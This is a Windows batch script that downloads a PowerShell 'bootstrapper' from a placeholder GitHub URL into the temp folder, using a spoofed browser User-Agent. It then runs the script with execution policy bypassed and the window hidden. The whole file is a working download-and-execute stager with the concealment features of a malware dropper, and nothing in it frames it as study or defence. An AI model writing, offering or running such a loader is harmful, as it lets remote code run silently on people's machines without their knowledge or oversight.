@echo off
setlocal EnableDelayedExpansion

:: Where to save the bootstrapper
set "BootFile=%TEMP%\Elliot-Bootstrapper.ps1"

:: Download the bootstrapper
powershell -Command ^
 "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Mozilla/5.0'); $s=$wc.DownloadString('https://raw.githubusercontent.com/YourGitHubUser/YourRepo/main/Elliot-Bootstrapper.ps1'); Set-Content -Path '%BootFile%' -Value $s"

:: Execute it hidden
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%BootFile%"
